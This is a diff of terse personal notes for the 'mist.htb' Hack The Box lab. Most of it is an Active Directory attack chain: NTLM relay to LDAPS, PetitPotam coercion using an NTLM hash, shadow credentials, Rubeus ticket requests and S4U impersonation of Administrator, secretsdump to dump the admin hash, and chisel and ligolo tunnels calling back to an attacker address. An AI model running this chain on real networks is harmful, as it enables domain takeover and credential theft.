@@ -51,13 +51,23 @@ proxychains nxc ldap 192.168.100.100 -u brandon.keywarp -H <ntlm> -M maq -> mach
 -- ntlm relay
 .\chisel.exe client <myip>:<myport> <any port on ms01 like 9999>:127.0.0.1:80
 proxychains4 /home/parrot/Documents/mist/impacket/examples/ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
-mcs EtwStartWebClient.cs -> upload EtwStartWebClient.exe and run
-proxychains4 ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
+mcs EtwStartWebClient.cs -> upload EtwStartWebClient.exe and run. It will activate webdav service.
+(Alternative: net * http://localhost)
+./petitpotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb 'MS01@9999/rogue' 192.168.100.101 -pipe all
 nc 127.0.0.1 11000; clear_shadow_creds MS01$; set_shadow_creds MS01$; -> get .pfx file and password
 
 .\Rubeus.exe asktgt /user:MS01$ /certificate:<.pfx> /getcredentials /show /nowrap /password:<pass> -> get ntlm hash of MS01$
-.\Rubeus.exe asktgt /nowrap /user:"ms01$" /rc4:2FF60EF11A5396F71662A2D72C1B8621
+.\Rubeus.exe asktgt /nowrap /user:"ms01$" /rc4:<ntlm>
 .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:ms01.tgt.kirbi /outfile:ms01.s4u.kirbi
 ticketConverter ms01.s4u.kirbi ms01.ccache
 export KRB5CCNAME=ms01.ccache
-proxychains secretsdump.py administrator@ms01.mist.htb -k -no-pass
+
+proxychains secretsdump.py administrator@ms01.mist.htb -k -no-pass -> ntlm hash of admin
+(In my case, it didn't work, so I set up ligolo, sudo ntpdate dc01 and run without proxychains)
+sudo ip tuntap add user parrot mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+.\agent.exe --connect 10.10.16.76:11601 -ignore-cert
+interface_add_route --name ligolo --route 192.168.100.101/24
+interface_route_del
+start
